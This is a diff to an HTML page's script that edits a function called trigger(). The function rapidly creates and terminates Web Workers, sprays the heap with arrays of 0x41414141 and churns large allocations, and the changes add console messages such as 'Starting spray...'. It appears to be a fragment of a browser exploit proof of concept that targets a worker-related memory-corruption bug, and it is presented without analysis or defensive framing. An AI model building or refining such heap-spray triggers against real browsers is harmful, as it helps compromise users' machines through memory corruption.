@@ -5,19 +5,22 @@
         async function trigger() {
             let workerUrl = "./worker.js";
             let spray = [];
-            for (let i = 0; i < 100; i++) {
+            console.log("Starting spray...");
+            for (let i = 0; i < 50; i++) {
                 try {
                     let worker = new Worker(workerUrl);
                     worker.postMessage("test");
                     worker.onmessage = () => {};
                     worker.terminate();
-                    let payload = new Array(512).fill("A");
-                    spray.push(payload);
-                } catch (e) {}
+                    spray.push({ ptr: new Array(128).fill(0x41414141), data: "test" });
+                } catch (e) {
+                    console.log("Error:", e);
+                }
                 let largeObject = new Array(500000).fill(0);
                 largeObject = null;
             }
             spray = null;
+            console.log("Spray complete");
         }
     </script>
 </head>
